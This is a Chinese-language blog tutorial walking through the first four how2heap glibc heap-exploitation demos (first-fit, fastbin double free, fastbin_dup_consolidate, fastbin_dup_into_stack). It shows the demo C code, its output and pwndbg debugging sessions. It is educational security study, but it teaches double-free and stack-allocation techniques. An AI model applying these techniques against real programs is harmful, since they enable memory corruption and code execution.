# how2heap之开篇

阅读量 **926551**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-02-13 14:30:54

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01e0c10f1efb991b6e.jpg)

> 欢迎各位喜欢安全的小伙伴们加入星盟安全 UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
> how2heap系列几个月前更新了!!!!大事件,正好寒假时间充裕,不如把how2heap总结一遍算了,千万别咕咕咕了hhh

PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 🙂

## 参考网站

    
    
    https://ctf-wiki.github.io/ctf-wiki/pwn
    https://blog.csdn.net/liying_1234/article/details/52053183
    https://code.woboq.org/
    https://github.com/shellphish/how2heap/tree/master/glibc_2.25
    https://xz.aliyun.com/t/2582#toc-4
    

## 前置

因为分为glibc2.25和glibc2.26,  
因此我先起一个ubuntu16.04的docker

_注:tcache,largebin,unsorted bin为先进后出,fastbin,smallbin为先进先出_

    
    
    git clone https://github.com/shellphish/how2heap.git
    cd how2heap
    make
    

对glibc的内存管理机制不熟的小伙伴,这里强烈推荐华庭师傅的glibc内存管理!!

虽然版本有些老,但是对理解glibc还是有极大的帮助的

## 0x01 first-fit

###  源代码

我们先看看源代码,这里我做了些处理,将一些作者的话删掉了:)

删掉的话的大概意思就是本文件不是攻击demo,而是对glibc一个选择chunk机制(first-fit)的一个说明,这个机制经常被用在uaf的利用中

所谓的first-fit就是首次适应算法,这里有一篇文章对常见内存分配算法有一个总结:  
[常见内存分配算法](https://blog.csdn.net/liying_1234/article/details/52053183)

好了,不影响,我们直接看源代码,加了一小点翻译

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    int main()
    {
            //分配两个缓冲区,不一定是fastbin,可以比较大的
            fprintf(stderr, "Allocating 2 buffers. They can be large, don't have to be fastbin.n");
            char* a = malloc(0x512);
            char* b = malloc(0x256);
            char* c;
    
            fprintf(stderr, "1st malloc(0x512): %pn", a);
            fprintf(stderr, "2nd malloc(0x256): %pn", b);
            fprintf(stderr, "we could continue mallocing here...n");
            fprintf(stderr, "now let's put a string at a that we can read later "this is A!"n");
            strcpy(a, "this is A!");
            fprintf(stderr, "first allocation %p points to %sn", a, a);
    
            fprintf(stderr, "Freeing the first one...n");
            free(a);
    
            //我们不用再释放其他的缓冲区了,只要我们分配的小于0x512,就可以从刚刚free的内存里取
            fprintf(stderr, "We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at %pn", a);
    
    
            fprintf(stderr, "So, let's allocate 0x500 bytesn");
            c = malloc(0x500);
            fprintf(stderr, "3rd malloc(0x500): %pn", c);
            fprintf(stderr, "And put a different string here, "this is C!"n");
            strcpy(c, "this is C!");
            fprintf(stderr, "3rd allocation %p points to %sn", c, c);
            fprintf(stderr, "first allocation %p points to %sn", a, a);
            fprintf(stderr, "If we reuse the first allocation, it now holds the data from the third allocation.n");
    }
    

###  程序结果

我们再运行一下程序

    
    
    This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.
    glibc uses a first-fit algorithm to select a free chunk.
    If a chunk is free and large enough, malloc will select this chunk.
    This can be exploited in a use-after-free situation.
    Allocating 2 buffers. They can be large, don't have to be fastbin.
    1st malloc(0x512): 0x1e03010
    2nd malloc(0x256): 0x1e03530
    we could continue mallocing here...
    now let's put a string at a that we can read later "this is A!"
    first allocation 0x1e03010 points to this is A!
    Freeing the first one...
    We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x1e03010
    So, let's allocate 0x500 bytes
    3rd malloc(0x500): 0x1e03010
    And put a different string here, "this is C!"
    3rd allocation 0x1e03010 points to this is C!
    first allocation 0x1e03010 points to this is C!
    If we reuse the first allocation, it now holds the data from the third allocation.
    

###  关键部分调试

因为内容比较简单,这里就做一个写入内容的对比吧

  1. 首先在写c之前下一个断点

    
    
    pwndbg>
    31              fprintf(stderr, "3rd malloc(0x500): %pn", c);
    32              fprintf(stderr, "And put a different string here, "this is C!"n");
    33              strcpy(c, "this is C!");
    34              fprintf(stderr, "3rd allocation %p points to %sn", c, c);
    35              fprintf(stderr, "first allocation %p points to %sn", a, a);
    36              fprintf(stderr, "If we reuse the first allocation, it now holds the data from the third allocation.n");
    37      }
    pwndbg> b 32
    Breakpoint 1 at 0x400842: file first_fit.c, line 32.
    

  1. 运行一下康康  
程序停在了第32行

    
    
    1st malloc(0x512): 0x603010
    2nd malloc(0x256): 0x603530
    we could continue mallocing here...
    now let's put a string at a that we can read later "this is A!"
    first allocation 0x603010 points to this is A!
    Freeing the first one...
    We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x603010
    So, let's allocate 0x500 bytes
    3rd malloc(0x500): 0x603010
    

那我们先看看a的内容吧

    
    
    pwndbg> p a
    $17 = 0x603010 "25037335367377177"
    

然后再看下c的内容

    
    
    pwndbg> p c
    $18 = 0x603010 "25037335367377177"
    

可以看到此时a,c位于同一内存空间

现在两个单步直接给c赋值为”this is c”  
此时康康a和c的内容

    
    
    pwndbg> p a
    $19 = 0x603010 "this is C!"
    pwndbg> p c
    $20 = 0x603010 "this is C!"
    

更改c时成功更改了a的内容

###  总结

可以看到程序先分配了两个chunk块a(0x512),b(0x256)

然后给a赋值为”this is A”,释放a,之后分配c(0x500)

然后给C赋值为”this is C”,此时输出a,c的地址和内容

发现a块和c块内存地址相同,但a的内容改为了C,程序成功通过修改c来修改来a块

而这也可以通过修改a块来修改c块的内容,而这也是一个uaf漏洞(free后并未置0) 🙂

first-fit的内容比较简单,这里也不再多讲,进入下一个

## 0x02 fastbin_dup

###  源代码

还是先看源代码

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    int main()
    {
            //一个基于fasstbin的简单的double-free利用
            fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.n");
    
            fprintf(stderr, "Allocating 3 buffers.n");
            int *a = malloc(8);
            int *b = malloc(8);
            int *c = malloc(8);
    
            fprintf(stderr, "1st malloc(8): %pn", a);
            fprintf(stderr, "2nd malloc(8): %pn", b);
            fprintf(stderr, "3rd malloc(8): %pn", c);
    
            fprintf(stderr, "Freeing the first one...n");
            free(a);
            //如果再free一次a,程序就会crash,因为a是free链上的最顶的chunk
            fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.n", a, a);
            // free(a);
            //因此我们free b
            fprintf(stderr, "So, instead, we'll free %p.n", b);
            free(b);
            //现在再free一次a
            fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.n", a);
            free(a);
            //现在我们的free链变成了 a->b->a
            fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!n", a, b, a, a);
            fprintf(stderr, "1st malloc(8): %pn", malloc(8));
            fprintf(stderr, "2nd malloc(8): %pn", malloc(8));
            fprintf(stderr, "3rd malloc(8): %pn", malloc(8));
    }
    

###  运行结果

运行一下康康

    
    
    This file demonstrates a simple double-free attack with fastbins.
    Allocating 3 buffers.
    1st malloc(8): 0xd07010
    2nd malloc(8): 0xd07030
    3rd malloc(8): 0xd07050
    Freeing the first one...
    If we free 0xd07010 again, things will crash because 0xd07010 is at the top of the free list.
    So, instead, we'll free 0xd07030.
    Now, we can free 0xd07010 again, since it's not the head of the free list.
    Now the free list has [ 0xd07010, 0xd07030, 0xd07010 ]. If we malloc 3 times, we'll get 0xd07010 twice!
    1st malloc(8): 0xd07010
    2nd malloc(8): 0xd07030
    3rd malloc(8): 0xd07010
    

###  关键部分调试

这里我们一共下4个断点,分别在每次free前和最后分配的时候

首先看看没free前的堆

    
    
    pwndbg> heap
    0x602000 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x602020 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x602040 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x20fa1
    }
    0x602060 PREV_INUSE {
      prev_size = 0,
      size = 135073,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    

可以看到一共三块空间a,b,c  
然后我们先free a

    
    
    pwndbg> bins
    fastbins
    0x20: 0x602000 ◂— 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
    

然后free b

    
    
    pwndbg> bins
    fastbins
    0x20: 0x602020 —▸ 0x602000 ◂— 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
    

然后再free a

    
    
    pwndbg> bins
    fastbins
    0x20: 0x602000 —▸ 0x602020 ◂— 0x602000
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
    

可以看到已经构成了一个chunk 环即a->b->a,然后我们再分配空间

    
    
    3rd malloc(8): 0x602010n0x602010, 0x602030, 0x602010 ]. If we malloc 3 times, we'll get 0x602010 twice!
    

成功分配了两次a的空间

_注:这里要注意mem内存指针和chunk指针不一样,mem内存指针也就是给用户的内存指针,并不是chunk头指针_

###  总结

程序先malloc了三块内存a,b,c

然后先释放a,再释放b,最后再释放一次a

此时的free list为a->b->a

然后再malloc3次分配到了a,b,a的内存,此时我们就得到了两次a的内存,修改其中任意一个就会影响另一块,这也就是double free的攻击demo了

而fastbin 的 double free为什么能成功呢?

这里借用[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/)的一段话:

    
    
    fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空
    fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。
    
    /* Another simple check: make sure the top of the bin is not the
           record we are going to add (i.e., double free).  */
        if (__builtin_expect (old == p, 0))
          {
            errstr = "double free or corruption (fasttop)";
            goto errout;
    }
    

所以只要不是连续释放同一个堆块即可,想要验证的同学可以把文中注释掉free(a)的那一行取消注释编译运行一下:-)

## 0x03 fastbin_dup_consolidate

###  源代码

    
    
    #include <stdio.h>
    #include <stdint.h>
    #include <stdlib.h>
    
    int main() {
      void* p1 = malloc(0x40);
      void* p2 = malloc(0x40);
      fprintf(stderr, "Allocated two fastbins: p1=%p p2=%pn", p1, p2);
      fprintf(stderr, "Now free p1!n");
      free(p1);
    
      void* p3 = malloc(0x400);
      //分配一个large bin来触发malloc_consolidate函数
      fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%pn", p3);
      //通过malloc_consolidate函数我们可以把free掉的p1移动到unsorted bin中
      fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.n");
      free(p1);
      ##然后就可以触发double free漏洞了
      fprintf(stderr, "Trigger the double free vulnerability!n");
      fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.n");
      //现在p1既在unsorted bin中又在fastbin中,因此我们再分配两次p1大小的内存,就可以分配到同一款内存
      fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %pn", malloc(0x40), malloc(0x40));
    }
    

###  运行结果

    
    
    Allocated two fastbins: p1=0x14ba010 p2=0x14ba060
    Now free p1!
    Allocated large bin to trigger malloc_consolidate(): p3=0x14ba0b0
    In malloc_consolidate(), p1 is moved to the unsorted bin.
    Trigger the double free vulnerability!
    We can pass the check in malloc() since p1 is not fast top.
    Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x14ba010 0x14ba010
    

###  关键部分调试

**part 1**

这里我们把断点下在第一次free p1 ,malloc p3,第二次free p1和最后的分配内存部分,也就是

    
    
    Line number 20 out of range; glibc_2.25/fastbin_dup_consolidate.c has 19 lines.
    pwndbg> b 11
    Breakpoint 1 at 0x4006b6: file glibc_2.25/fastbin_dup_consolidate.c, line 11.
    pwndbg> b 13
    Breakpoint 2 at 0x4006c4: file glibc_2.25/fastbin_dup_consolidate.c, line 13.
    pwndbg> b 16
    Breakpoint 3 at 0x40070b: file glibc_2.25/fastbin_dup_consolidate.c, line 16.
    pwndbg> b 19
    Breakpoint 4 at 0x400782: file glibc_2.25/fastbin_dup_consolidate.c, line 19.
    

之后我们运行一下

    
    
    pwndbg> heap
    0x602000 FASTBIN {
      prev_size = 0,
      size = 81,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602050 FASTBIN {
      prev_size = 0,
      size = 81,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6020a0 PREV_INUSE {
      prev_size = 0,
      size = 135009,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x602000 ◂— 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
    

可以看到此时的p1被放到了fastbin中,然后我们malloc一个0x400的大chunk,这样就会触发malloc_consolidate()

此时的堆

    
    
    pwndbg> heap
    0x602000 FASTBIN {
      prev_size = 0,
      size = 81,
      fd = 0x7ffff7dd1bb8 <main_arena+152>,
      bk = 0x7ffff7dd1bb8 <main_arena+152>,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602050 {
      prev_size = 80,
      size = 80,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6020a0 PREV_INUSE {
      prev_size = 0,
      size = 1041,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6024b0 PREV_INUSE {
      prev_size = 0,
      size = 133969,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    0x50: 0x602000 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x602000
    largebins
    empty
    

这个时候,我们之前free掉的chunk已经被放进了small bin中

**part 2**

**划重点,这个过程中到底发生了什么呢?**

  1. 问题一:啥是malloc_consolidate函数??

我们直接看源代码吧

    
    
       static void malloc_consolidate(mstate av)
    {
      mfastbinptr*    fb;                 /* current fastbin being consolidated */
      mfastbinptr*    maxfb;              /* last fastbin (for loop control) */
      mchunkptr       p;                  /* current chunk being consolidated */
      mchunkptr       nextp;              /* next chunk to consolidate */
      mchunkptr       unsorted_bin;       /* bin header */
      mchunkptr       first_unsorted;     /* chunk to link to */
      /* These have same use as in free() */
      mchunkptr       nextchunk;
      INTERNAL_SIZE_T size;
      INTERNAL_SIZE_T nextsize;
      INTERNAL_SIZE_T prevsize;
      int             nextinuse;
      atomic_store_relaxed (&av->have_fastchunks, false);
      unsorted_bin = unsorted_chunks(av);
      /*
        Remove each chunk from fast bin and consolidate it, placing it
        then in unsorted bin. Among other reasons for doing this,
        placing in unsorted bin avoids needing to calculate actual bins
        until malloc is sure that chunks aren't immediately going to be
        reused anyway.
      */
      maxfb = &fastbin (av, NFASTBINS - 1);
      fb = &fastbin (av, 0);
      do {
        p = atomic_exchange_acq (fb, NULL);
        if (p != 0) {
          do {
            {
              unsigned int idx = fastbin_index (chunksize (p));
              if ((&fastbin (av, idx)) != fb)
                malloc_printerr ("malloc_consolidate(): invalid chunk size");
            }
            check_inuse_chunk(av, p);
            nextp = p->fd;
            /* Slightly streamlined version of consolidation code in free() */
            size = chunksize (p);
            nextchunk = chunk_at_offset(p, size);
            nextsize = chunksize(nextchunk);
            if (!prev_inuse(p)) {
              prevsize = prev_size (p);
              size += prevsize;
              p = chunk_at_offset(p, -((long) prevsize));
              if (__glibc_unlikely (chunksize(p) != prevsize))
                malloc_printerr ("corrupted size vs. prev_size in fastbins");
              unlink_chunk (av, p);
            }
            if (nextchunk != av->top) {
              nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
              if (!nextinuse) {
                size += nextsize;
                unlink_chunk (av, nextchunk);
              } else
                clear_inuse_bit_at_offset(nextchunk, 0);
              first_unsorted = unsorted_bin->fd;
              unsorted_bin->fd = p;
              first_unsorted->bk = p;
              if (!in_smallbin_range (size)) {
                p->fd_nextsize = NULL;
                p->bk_nextsize = NULL;
              }
              set_head(p, size | PREV_INUSE);
              p->bk = unsorted_bin;
              p->fd = first_unsorted;
              set_foot(p, size);
            }
            else {
              size += nextsize;
              set_head(p, size | PREV_INUSE);
              av->top = p;
            }
          } while ( (p = nextp) != 0);
        }
      } while (fb++ != maxfb);
    }
    

这里我做一个解释

先确定堆是否被初始化了(也就是get_max_fast()函数),如果没有就初始化堆，然后退出函数

从 fastbin 中获取一个空闲 chunk,尝试向后合并

如果不能向后合并就尝试向前合并

如果向前合并的时候与top_chunk相邻,就直接归到top_chunk中

如果并不相邻就插入到unsorted bin,然后继续取fastbin chunk直到fastbin list为空结束

本例中的触发代码为:

    
    
    /*
    ​     If this is a large request, consolidate fastbins before continuing.
    ​     While it might look excessive to kill all fastbins before
    ​     even seeing if there is space available, this avoids
    ​     fragmentation problems normally associated with fastbins.
    ​     Also, in practice, programs tend to have runs of either small or
    ​     large requests, but less often mixtures, so consolidation is not
    ​     invoked all that often in most programs. And the programs that
    ​     it is called frequently in otherwise tend to fragment.
       */
    
      else
    ​    {
    ​      idx = largebin_index (nb);
    ​      if (have_fastchunks (av))
    ​        malloc_consolidate (av);
    }
    

  1. 说好的unsorted bin呢????

这还是得从glibc的实现说起,为什么调试的时候我们的chunk并不在unsorted bin中而是在small bin中呢?

对glibc不太熟悉的同学可以先看下我之前的文章[glibc内存管理机制](https://nightrainy.github.io/2019/05/06/glic%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)

这部分可以在我的文章中搜索large bin直接到第8个地方,不想跳转的同学我这里也做一下简短的解释

我们在分配largebin时,ptmalloc会先遍历一下fastbin,将相邻的 chunk 进行合并，并链接到 unsorted bin 中然后遍历
unsorted bin 中的 chunk，如果 unsorted bin 只 有一个 chunk，并且这个 chunk
在上次分配时被使用过，并且所需分配的 chunk 大 小属于 small bins，并且 chunk 的大小大于等于需要分配的大小，这种情况下就直接将该
chunk 进行切割，分配结束，否则将根据 chunk 的空间大小将其放入 small bins 或是 large bins 中

这就是为什么不在unsorted bin而在small bin中的原因了

下面就是一点点的拓展

然后如果连large bin中都没有合适的,那就只能从top chunk中分割出一部分了,如果连top
chunk也不满足,那就会mmap或brk一块内存增加top chunk的大小

**part 3**

之后我们继续调试,我们现在第二次free p1,此时的堆结构

    
    
    pwndbg> heap
    0x602000 FASTBIN {
      prev_size = 0,
      size = 81,
      fd = 0x0,
      bk = 0x7ffff7dd1bb8 <main_arena+152>,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602050 {
      prev_size = 80,
      size = 80,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6020a0 PREV_INUSE {
      prev_size = 0,
      size = 1041,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6024b0 PREV_INUSE {
      prev_size = 0,
      size = 133969,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x602000 ◂— 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    0x50 [corrupted]
    FD: 0x602000 ◂— 0x0
    BK: 0x602000 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x602000
    largebins
    empty
    

这里就可以看到他既在smallbins中又在fastbin中了,这又是为什么呢?

因为再free的时候ptmalloc会发现fastbin是空的,因此就把他扔到fastbin中去了

此时就可以分配两次p1了,一次系统会在fastbin中取出(优先查看fastbin),第二次就会在smallbins中取出:)

###  总结

程序先malloc了两个fastbin chunk(0x40),然后free掉第一个chunk

这里为啥不free第二个呢,因为如果free第二个的话就会和top chunk相邻了,此时会触发top chunk的合并

之后程序调用了malloc函数malloc了一个large
bin,触发了malloc_consoldate()函数,导致我们free掉的chunk1被放入了small bin中

然后程序第二次free chunk1,ptmalloc会先看fastbin中有没有,发现没有,于是就把chunk1放到fast
bin中了,这时chunk1就在fastbin和smallbin中各有一个

此时程序再申请两次0x40的chunk,ptmalloc先从fastbin中把chunk1取出来给用户,然后再从smallbin中再次把chunk1取出来给用户

我们就有了两个拥有同样内存的chunk

## 0x04 fastbin_dup_into_stack

###  源代码

这里我也加了一点点小翻译:)

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    int main()
    {
            //这个程序就是fast_dup.c的2.0版本,作用就是欺骗系统把malloc的地址转到我们所能控制内容的栈上,也就是让下一次分配内存时在我们所能控制的栈上分配
            fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc inton"
                   "returning a pointer to a controlled location (in this case, the stack).n");
    
            unsigned long long stack_var;
    
            //我们控制分配的地址就是这个栈上变量的地方
            fprintf(stderr, "The address we want malloc() to return is %p.n", 8+(char *)&stack_var);
    
            fprintf(stderr, "Allocating 3 buffers.n");
            int *a = malloc(8);
            int *b = malloc(8);
            int *c = malloc(8);
    
            fprintf(stderr, "1st malloc(8): %pn", a);
            fprintf(stderr, "2nd malloc(8): %pn", b);
            fprintf(stderr, "3rd malloc(8): %pn", c);
    
            fprintf(stderr, "Freeing the first one...n");
            free(a);
    
            //这里还是一样的,不能连续释放同一个chunk
            fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.n", a, a);
            // free(a);
    
            fprintf(stderr, "So, instead, we'll free %p.n", b);
            free(b);
    
            //这里再次,释放a,double free
            fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.n", a);
            free(a);
    
    
            fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
                    "We'll now carry out our attack by modifying data at %p.n", a, b, a, a);
            //现在第一次分配内存,取出chunk a 赋给chunk d
            unsigned long long *d = malloc(8);
    
            //现在分配两次内存,取出chunk a,chunk b
            fprintf(stderr, "1st malloc(8): %pn", d);
            fprintf(stderr, "2nd malloc(8): %pn", malloc(8));
    
            //现在free list就只剩下一个chunk a了
            fprintf(stderr, "Now the free list has [ %p ].n", a);
    
            //现在的chunk a是free list的头chunk了,现在我们把一个假的free size写到栈上,这个时候ptmalloc就会认为栈上有一个free的chunk,就会把指针回转给他了
            fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.n"
                    "so now we are writing a fake free size (in this case, 0x20) to the stack,n"
                    "so that malloc will think there is a free chunk there and agree ton"
                    "return a pointer to it.n", a);
            stack_var = 0x20;
    
            //现在我们把栈指针的向前八个字节写成0x20,也就是伪造free size,然后把他赋给d
            fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.n", a);
            *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
    
            //这个时候就把栈指针写到了free list上了,此时再分配就是在栈上分配了
            fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free listn", malloc(8));
            fprintf(stderr, "4th malloc(8): %pn", malloc(8));
    }
    

###  运行结果

    
    
    This file extends on fastbin_dup.c by tricking malloc into
    returning a pointer to a controlled location (in this case, the stack).
    The address we want malloc() to return is 0x7ffe5c42b638.
    Allocating 3 buffers.
    1st malloc(8): 0x632010
    2nd malloc(8): 0x632030
    3rd malloc(8): 0x632050
    Freeing the first one...
    If we free 0x632010 again, things will crash because 0x632010 is at the top of the free list.
    So, instead, we'll free 0x632030.
    Now, we can free 0x632010 again, since it's not the head of the free list.
    Now the free list has [ 0x632010, 0x632030, 0x632010 ]. We'll now carry out our attack by modifying data at 0x632010.
    1st malloc(8): 0x632010
    2nd malloc(8): 0x632030
    Now the free list has [ 0x632010 ].
    Now, we have access to 0x632010 while it remains at the head of the free list.
    so now we are writing a fake free size (in this case, 0x20) to the stack,
    so that malloc will think there is a free chunk there and agree to
    return a pointer to it.
    Now, we overwrite the first 8 bytes of the data at 0x632010 to point right before the 0x20.
    3rd malloc(8): 0x632010, putting the stack address on the free list
    4th malloc(8): 0x7ffe5c42b638
    

###  关键部分调试

本次程序我在第41行,也就是给stack赋值之前的地方,第49行即给d赋值后,最后一个是在52行即最后的地方下断点

此时运行程序,我们看一下堆:

    
    
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x603020,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x603020 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x603000,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x603040 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x20fa1
    }
    0x603060 PREV_INUSE {
      prev_size = 0,
      size = 135073,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x603000 —▸ 0x603020 ◂— 0x603000
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
    pwndbg>
    

可以看到这个时候我们已经有了一个free的回环链

程序继续运行,d已经赋完了值,我们可以看到他的fb指针已经是stack_var的地址了

    
    
    pwndbg> x/10gx 0x603000
    0x603000:       0x0000000000000000      0x0000000000000021
    0x603010:       0x00007fffffffe5f8      0x0000000000000000
    0x603020:       0x0000000000000000      0x0000000000000021
    0x603030:       0x0000000000603000      0x0000000000000000
    0x603040:       0x0000000000000000      0x0000000000000021
    

这个时候我们看看bins

    
    
    pwndbg> bins
    fastbins
    0x20: 0x603000 —▸ 0x7fffffffe5f8 —▸ 0x603010 ◂— 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
    

可以看到free list中已经有了栈指针,那么这个时候我们再分配就可以分配到栈的内存空间了

    
    
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x7fffffffe5f8,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x603020 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x603000,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x603040 FASTBIN {
      prev_size = 0,
      size = 33,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x20fa1
    }
    0x603060 PREV_INUSE {
      prev_size = 0,
      size = 135073,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    

###  总结

程序先在栈上定义了一个变量stack_var

之后malloc了三个chunk a,b,c

之后做了一个double free,形成了一个a->b->a的free链

此时再次malloc了一个大小一样的chunk d,这个时候chunk d会拿出chunk a

之后我们又申请了一个一样大小的chunk出来拿出了b,这个时候链上就只剩下一个a了

此时我们伪造了stack_var,把他伪装成了一个free chunk,并且赋值给了chunk d,也就是chunk a,此时fd指针被伪造成了fake
chunk,形成了一个新的free链

最后再申请内存的时候,我们就取出了栈上的内存

如上

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **知世** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/197437](/post/id/197437)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [heap](/tag/heap)

 **+1** __11赞

 __收藏

![](https://p3.ssl.qhimg.com/t01b60c9bd9051ba29f.png) 知世

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

